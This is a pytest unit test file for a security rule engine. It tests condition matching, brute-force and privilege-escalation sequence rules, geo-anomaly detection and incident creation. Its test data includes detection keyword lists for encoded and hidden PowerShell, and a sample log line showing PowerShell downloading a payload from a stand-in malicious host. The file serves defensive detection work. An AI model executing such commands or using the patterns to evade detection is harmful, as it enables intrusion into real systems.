"""Unit tests for the rule engine condition evaluator and evaluation logic."""
from __future__ import annotations

import pytest
import pytest_asyncio
from datetime import datetime, timedelta, timezone
from unittest.mock import ANY, AsyncMock, MagicMock, patch

from app.services.rule_engine import _matches_condition, evaluate_rule, fire_incident_if_needed
from app.domain.models import Event, Rule


def _make_event(**kwargs) -> Event:
    """Helper: build an Event ORM object without a real DB."""
    e = Event(
        source_id="00000000-0000-0000-0000-000000000000",
        timestamp=kwargs.get("timestamp", datetime.now(timezone.utc)),
        severity=kwargs.get("severity", "info"),
        message=kwargs.get("message", ""),
        service=kwargs.get("service", None),
        host=kwargs.get("host", None),
        environment=kwargs.get("environment", None),
        event_type=kwargs.get("event_type", None),
        fields_json=kwargs.get("fields_json", {}),
        fingerprint=kwargs.get("fingerprint", None),
    )
    return e


def _make_rule(**kwargs) -> Rule:
    r = Rule(
        name=kwargs.get("name", "Test Rule"),
        condition_json=kwargs.get("condition_json", {}),
        sequence_json=kwargs.get("sequence_json"),
        group_by_entity=kwargs.get("group_by_entity"),
        mitre_techniques_json=kwargs.get("mitre_techniques_json"),
        mitre_tactic=kwargs.get("mitre_tactic"),
        threshold=kwargs.get("threshold", 3),
        window_seconds=kwargs.get("window_seconds", 300),
        severity=kwargs.get("severity", "warning"),
        enabled=kwargs.get("enabled", True),
    )
    if "id" in kwargs:
        r.id = kwargs["id"]
    return r


# ---------------------------------------------------------------------------
# _matches_condition unit tests
# ---------------------------------------------------------------------------

class TestMatchesCondition:
    def test_empty_condition_always_matches(self):
        e = _make_event(severity="info")
        assert _matches_condition(e, {}) is True

    def test_severity_match(self):
        e = _make_event(severity="error")
        assert _matches_condition(e, {"severity": "error"}) is True

    def test_severity_no_match(self):
        e = _make_event(severity="info")
        assert _matches_condition(e, {"severity": "error"}) is False

    def test_severity_in_match(self):
        e = _make_event(severity="critical")
        assert _matches_condition(e, {"severity_in": ["error", "critical"]}) is True

    def test_severity_in_no_match(self):
        e = _make_event(severity="info")
        assert _matches_condition(e, {"severity_in": ["error", "critical"]}) is False

    def test_message_contains_match(self):
        e = _make_event(message="OOM killer activated")
        assert _matches_condition(e, {"message_contains": "OOM"}) is True

    def test_message_contains_case_insensitive(self):
        e = _make_event(message="Disk full error occurred")
        assert _matches_condition(e, {"message_contains": "disk full"}) is True

    def test_message_contains_no_match(self):
        e = _make_event(message="all good")
        assert _matches_condition(e, {"message_contains": "error"}) is False

    def test_message_contains_any_match(self):
        e = _make_event(message="powershell.exe -EncodedCommand AAAA")
        assert _matches_condition(
            e,
            {"message_contains_any": ["powershell -enc", "-encodedcommand", "invoke-expression"]},
        ) is True

    def test_message_contains_any_no_match(self):
        e = _make_event(message="normal service startup completed")
        assert _matches_condition(
            e,
            {"message_contains_any": ["powershell -enc", "-encodedcommand", "invoke-expression"]},
        ) is False

    def test_service_match(self):
        e = _make_event(service="nginx")
        assert _matches_condition(e, {"service": "nginx"}) is True

    def test_service_no_match(self):
        e = _make_event(service="postgres")
        assert _matches_condition(e, {"service": "nginx"}) is False

    def test_host_match(self):
        e = _make_event(host="web01")
        assert _matches_condition(e, {"host": "web01"}) is True

    def test_host_no_match(self):
        e = _make_event(host="db01")
        assert _matches_condition(e, {"host": "web01"}) is False

    def test_combined_severity_and_message(self):
        e = _make_event(severity="error", message="connection refused")
        assert _matches_condition(e, {"severity": "error", "message_contains": "connection"}) is True

    def test_combined_fails_if_one_criterion_fails(self):
        e = _make_event(severity="info", message="connection refused")
        assert _matches_condition(e, {"severity": "error", "message_contains": "connection"}) is False

    def test_environment_match(self):
        e = _make_event(environment="production")
        assert _matches_condition(e, {"environment": "production"}) is True

    def test_environment_no_match(self):
        e = _make_event(environment="staging")
        assert _matches_condition(e, {"environment": "production"}) is False

    def test_event_type_match(self):
        e = _make_event(event_type="deployment")
        assert _matches_condition(e, {"event_type": "deployment"}) is True

    def test_event_type_no_match(self):
        e = _make_event(event_type="auth")
        assert _matches_condition(e, {"event_type": "deployment"}) is False

    def test_field_match_uses_fields_json(self):
        e = _make_event(fields_json={"username": "root", "source_ip": "10.0.0.5"})
        assert _matches_condition(e, {"field": "username", "value": "root"}) is True

    def test_field_match_fails_for_different_value(self):
        e = _make_event(fields_json={"username": "admin"})
        assert _matches_condition(e, {"field": "username", "value": "root"}) is False

    def test_field_in_matches_any_value(self):
        e = _make_event(fields_json={"event_action": "failed_password"})
        assert _matches_condition(e, {"field": "event_action", "value_in": ["failed_password", "invalid_user"]}) is True


# ---------------------------------------------------------------------------
# evaluate_rule tests (mocked DB session)
# ---------------------------------------------------------------------------

class TestEvaluateRule:
    @pytest.mark.asyncio
    async def test_would_fire_when_threshold_reached(self):
        now = datetime.now(timezone.utc)
        events = [_make_event(severity="error", timestamp=now - timedelta(seconds=i)) for i in range(5)]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(condition_json={"severity": "error"}, threshold=3, window_seconds=300)
        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 5
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_would_not_fire_below_threshold(self):
        now = datetime.now(timezone.utc)
        events = [_make_event(severity="error", timestamp=now - timedelta(seconds=i)) for i in range(2)]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(condition_json={"severity": "error"}, threshold=3, window_seconds=300)
        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 2
        assert would_fire is False

    @pytest.mark.asyncio
    async def test_condition_filters_non_matching_events(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(severity="error", timestamp=now),
            _make_event(severity="info", timestamp=now),
            _make_event(severity="info", timestamp=now),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(condition_json={"severity": "error"}, threshold=1)
        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_empty_event_list_does_not_fire(self):
        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = []

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(condition_json={}, threshold=1)
        count, would_fire = await evaluate_rule(session, rule)

        assert count == 0
        assert would_fire is False

    @pytest.mark.asyncio
    async def test_exact_threshold_fires(self):
        now = datetime.now(timezone.utc)
        events = [_make_event(severity="warning", timestamp=now) for _ in range(3)]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(condition_json={"severity": "warning"}, threshold=3)
        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 3
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_sequence_rule_matches_ordered_steps_with_grouping(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=40),
                service="sshd",
                fields_json={"username": "alice", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=30),
                service="sshd",
                fields_json={"username": "alice", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=20),
                service="sshd",
                fields_json={"username": "alice", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                service="sshd",
                fields_json={"username": "bob", "event_action": "failed_password"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={},
            sequence_json=[
                {"field": "event_action", "value": "failed_password"},
                {"field": "event_action", "value": "failed_password"},
                {"field": "event_action", "value": "login_success"},
            ],
            group_by_entity="username",
            threshold=1,
            window_seconds=300,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_sequence_rule_groups_by_multiple_fields(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=50),
                service="sshd",
                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=40),
                service="sshd",
                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=30),
                service="sshd",
                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=20),
                service="sshd",
                fields_json={"username": "alice", "source_ip": "10.0.0.99", "event_action": "failed_password"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                service="sshd",
                fields_json={"username": "alice", "source_ip": "10.0.0.99", "event_action": "failed_password"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={},
            sequence_json=[
                {"field": "event_action", "value": "failed_password"},
                {"field": "event_action", "value": "failed_password"},
                {"field": "event_action", "value": "failed_password"},
            ],
            group_by_entity="username,source_ip",
            threshold=1,
            window_seconds=300,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_privilege_escalation_sequence_matches_same_user_and_host(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=45),
                host="srv-admin-01",
                fields_json={"username": "alice", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=30),
                host="srv-admin-01",
                fields_json={"username": "alice", "event_action": "privilege_change"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=15),
                host="srv-admin-01",
                fields_json={"username": "alice", "event_action": "sudo_command"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                host="srv-admin-99",
                fields_json={"username": "alice", "event_action": "sudo_command"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={},
            sequence_json=[
                {"field": "event_action", "value_in": ["login_success", "auth_success"]},
                {"field": "event_action", "value_in": ["privilege_change", "sudo_start", "admin_group_add"]},
                {"field": "event_action", "value_in": ["sensitive_command", "sudo_command", "credential_dump_attempt"]},
            ],
            group_by_entity="username,host",
            threshold=1,
            window_seconds=600,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_geo_anomaly_detects_unseen_country_asn_for_user(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=50),
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=40),
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=30),
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={
                "type": "geo_anomaly",
                "entity_field": "username",
                "location_fields": ["country", "asn"],
                "min_history_events": 3,
                "min_distinct_locations": 1,
                "baseline_exclude_recent": 1,
            },
            threshold=1,
            window_seconds=3600,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True

    @pytest.mark.asyncio
    async def test_geo_anomaly_requires_min_history(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=20),
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={
                "type": "geo_anomaly",
                "entity_field": "username",
                "location_fields": ["country", "asn"],
                "min_history_events": 3,
                "baseline_exclude_recent": 1,
            },
            threshold=1,
            window_seconds=3600,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 0
        assert would_fire is False

    @pytest.mark.asyncio
    async def test_suspicious_powershell_chain_sequence_matches(self):
        now = datetime.now(timezone.utc)
        events = [
            _make_event(
                timestamp=now - timedelta(seconds=30),
                host="workstation-17",
                message="powershell.exe -windowstyle hidden -encodedcommand AAAA",
                fields_json={"username": "alice"},
            ),
            _make_event(
                timestamp=now - timedelta(seconds=10),
                host="workstation-17",
                message="powershell Invoke-WebRequest http://malicious.example/payload.ps1",
                fields_json={"username": "alice"},
            ),
        ]

        mock_result = MagicMock()
        mock_result.scalars.return_value.all.return_value = events

        session = AsyncMock()
        session.execute = AsyncMock(return_value=mock_result)

        rule = _make_rule(
            condition_json={},
            sequence_json=[
                {"message_contains_any": ["-encodedcommand", "-windowstyle hidden", "powershell -enc"]},
                {"message_contains_any": ["invoke-webrequest", "downloadstring(", "mshta"]},
            ],
            group_by_entity="host",
            threshold=1,
            window_seconds=900,
        )

        count, would_fire = await evaluate_rule(session, rule, reference_time=now)

        assert count == 1
        assert would_fire is True


class TestFireIncidentIfNeeded:
    @pytest.mark.asyncio
    async def test_created_incident_is_marked_for_auto_triage(self):
        now = datetime.now(timezone.utc)
        matched_events = [
            _make_event(timestamp=now - timedelta(seconds=5)),
            _make_event(timestamp=now),
        ]

        existing = MagicMock()
        existing.scalar_one_or_none.return_value = None

        session = AsyncMock()
        session.add = MagicMock()
        session.info = {}
        session.execute = AsyncMock(return_value=existing)

        rule = _make_rule(id="rule-1", name="SSH burst", severity="warning")

        with patch("app.services.rule_engine.mark_incident_for_auto_triage") as mark_triage:
            incident = await fire_incident_if_needed(
                session, rule,
                event_count=len(matched_events),
                first_seen=matched_events[0].timestamp,
                last_seen=matched_events[-1].timestamp,
            )

        assert incident is not None
        mark_triage.assert_called_once_with(session, ANY)

    @pytest.mark.asyncio
    async def test_created_incident_is_marked_for_notification(self):
        now = datetime.now(timezone.utc)
        matched_events = [
            _make_event(timestamp=now - timedelta(seconds=5)),
            _make_event(timestamp=now),
        ]

        existing = MagicMock()
        existing.scalar_one_or_none.return_value = None

        session = AsyncMock()
        session.add = MagicMock()
        session.info = {}
        session.execute = AsyncMock(return_value=existing)

        rule = _make_rule(id="rule-1", name="SSH burst", severity="warning")

        with patch("app.services.rule_engine.mark_incident_for_notification") as mark_notification:
            incident = await fire_incident_if_needed(
                session, rule,
                event_count=len(matched_events),
                first_seen=matched_events[0].timestamp,
                last_seen=matched_events[-1].timestamp,
            )

        assert incident is not None
        mark_notification.assert_called_once_with(session, ANY)

    @pytest.mark.asyncio
    async def test_created_incident_contains_confidence_and_rationale(self):
        now = datetime.now(timezone.utc)
        matched_events = [
            _make_event(timestamp=now - timedelta(seconds=5)),
            _make_event(timestamp=now),
        ]

        existing = MagicMock()
        existing.scalar_one_or_none.return_value = None

        session = AsyncMock()
        session.add = MagicMock()
        session.info = {}
        session.execute = AsyncMock(return_value=existing)

        rule = _make_rule(id="rule-1", name="PowerShell chain", severity="high")

        incident = await fire_incident_if_needed(
            session,
            rule,
            event_count=len(matched_events),
            first_seen=matched_events[0].timestamp,
            last_seen=matched_events[-1].timestamp,
            confidence_score=0.92,
            confidence_rationale="threshold=2/1, sequence_completeness=1.00, signal_strength=0.95",
        )

        assert incident is not None
        assert float(incident.confidence_score) == 0.92
        assert incident.confidence_rationale is not None
        assert "sequence_completeness" in incident.confidence_rationale

    @pytest.mark.asyncio
    async def test_created_incident_inherits_rule_mitre_metadata(self):
        now = datetime.now(timezone.utc)
        matched_events = [
            _make_event(timestamp=now - timedelta(seconds=5)),
            _make_event(timestamp=now),
        ]

        existing = MagicMock()
        existing.scalar_one_or_none.return_value = None

        session = AsyncMock()
        session.add = MagicMock()
        session.info = {}
        session.execute = AsyncMock(return_value=existing)

        rule = _make_rule(
            id="rule-1",
            name="PowerShell chain",
            severity="high",
            mitre_techniques_json=["T1059.001", "T1105"],
            mitre_tactic="execution",
        )

        incident = await fire_incident_if_needed(
            session,
            rule,
            event_count=len(matched_events),
            first_seen=matched_events[0].timestamp,
            last_seen=matched_events[-1].timestamp,
        )

        assert incident is not None
        assert incident.mitre_techniques_json == ["T1059.001", "T1105"]
        assert incident.mitre_tactic == "execution"
